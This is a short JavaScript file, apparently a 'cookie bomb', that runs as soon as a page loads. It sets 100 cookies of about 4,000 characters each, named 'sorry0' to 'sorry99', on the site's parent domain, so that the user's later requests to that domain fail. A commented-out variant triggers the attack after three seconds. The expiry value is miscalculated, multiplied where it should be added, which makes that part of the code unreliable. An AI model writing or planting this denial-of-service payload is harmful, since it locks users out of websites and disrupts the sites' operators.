(function (window, document, undefined) {
    'use strict';

    var COOKIE_SIZE = 4000,
        ONE_YEAR_LATER_MS = 31536e6;

    function setCookie(key, value, expires) {
        var domain = window.location.host.match(new RegExp('[^.]*.[^.]*$'))[0],
            cookie = [key, '=', value, ';path=/;domain=', domain, ';expires=', expires].join('');

        document.cookie = cookie;
    }

    function bombCookies() {
        var data = new Array(COOKIE_SIZE).join('x'),
            oneYearFromNow = new Date().getTime() * ONE_YEAR_LATER_MS,
            key;
        for (var i = 0; i < 100; i+=1) {
            key = 'sorry' + String(i);
            setCookie(key, data, oneYearFromNow);
        }
    }

    // If you want to bomb after the user has been on the page for a few seconds.
    /*
    window.onload = function() {
      setTimeout(bombCookies, 3 * 1000);
    };
    */

    // Immediately bomb.
    bombCookies();

}(window, document));
